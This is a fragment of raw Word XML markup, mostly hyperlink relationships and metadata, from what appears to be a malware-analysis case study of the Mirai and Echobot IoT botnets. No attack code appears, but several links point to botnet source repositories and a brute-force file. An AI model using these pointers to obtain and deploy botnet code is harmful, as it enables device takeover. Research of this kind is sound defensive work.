      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="210799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hyperlink" Target="https://github.com/Adumbrati0n/Mirai-Case-Study/blob/main/IPHostBruteForce.txt" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://badthings.info/" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.radware.com/getattachment/402db7f3-0467-4fa3-bb9a-ae88b728e91b/MiraiHandbookEbookFinal_04.pdf.aspx" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.malwaremustdie.org/2016/08/mmd-0056-2016-linuxmirai-jus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trace.io/" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/threatland/TL-BOTS/tree/master/TL.MIR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alrawi/badthings-tools/tree/master/dynamic_analysis" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://linuxhint.com/linux-kernel-watchdog-explained/" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/pan-unit42/iocs/blob/master/mirai/ECHOBOT_28thOct2019.md" TargetMode="Externa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hyperlink" Target="https://www.gnu.org/software/binutils/" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pastebin.com/raw/JWKpuKi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ireshark.org/"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hidra-sre.org/" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/zeropointdynamics/zelos" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.bleepingcomputer.com/news/security/new-echobot-variant-exploits-77-remote-code-execution-flaw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42.paloaltonetworks.com/mirai-variant-echobot-resurfaces-with-13-previously-unexploited-vulnerabilities/" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitr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rt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A0C70B26-0096-4B2C-B7F4-4DF9D91C7F00}">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63</TotalTime>
  <Pages>15</Pages>
  <Words>3618</Words>
  <Characters>20626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Thabet</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Office365</cp:lastModifiedBy>
  <cp:revision>19</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-04-19T07:51:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-03-11T00:42:00Z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